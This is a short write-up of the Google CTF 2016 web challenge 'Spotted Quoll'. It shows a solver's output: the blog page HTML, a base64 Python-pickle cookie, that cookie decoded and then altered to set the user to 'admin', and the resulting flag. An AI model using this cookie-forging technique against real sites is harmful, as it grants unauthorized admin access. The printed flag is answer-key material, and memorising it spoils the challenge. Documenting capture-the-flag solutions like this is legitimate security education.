# Google CTF 2016 : Spotted Quoll

**Category:** Web
**Points:** 50
**Solves:** 413
**Description:**

[This](https://spotted-quoll.ctfcompetition.com/) blog on Zombie research looks like it might be interesting - can you break into the /admin section?


## Write-up

### Script Output
```
HTML:
<html>
<head>
  <link href="/static/bootstrap.min.css" rel="stylesheet">
  <link href="/static/jumbotron-narrow.css" rel="stylesheet">
</head>
<body>

    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="#">./boringblog</a></li>
            <li role="presentation"><a href="/admin">Admin</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">yawn</h3>
      </div>

      <div class="jumbotron">
        <h1>My Zombie Research Project</h1>
        <p class="lead">./boringblog</p>
      </div>

      <div class="row marketing">
        <div class="col-lg-12">
          <h3>Blog Development - 20th January, 2016</h3>
          <p>I don't have much content yet, except for my admin page. Stay tuned for more information</p>
        </div>
      </div>
      <iframe style="border: 0;" src="/getCookie"></iframe>
    </div> <!-- /container -->

</body>
</html>

Cookies:
<RequestsCookieJar[<Cookie obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu for spotted-quoll.ctfcompetition.com/>]>

Real Pickle:
{'python': 'pickles', 'subtle': 'hint', 'user': None}

Spoofed Admin Pickle:
{'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}

Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
```

Flag
```
CTF{but_wait,theres_more.if_you_call}
```

[Python script](https://github.com/b0tchsec/CTF-Fanny-Pack/blob/master/solutions/google_2016/SpottedQuoll/pwn.py)
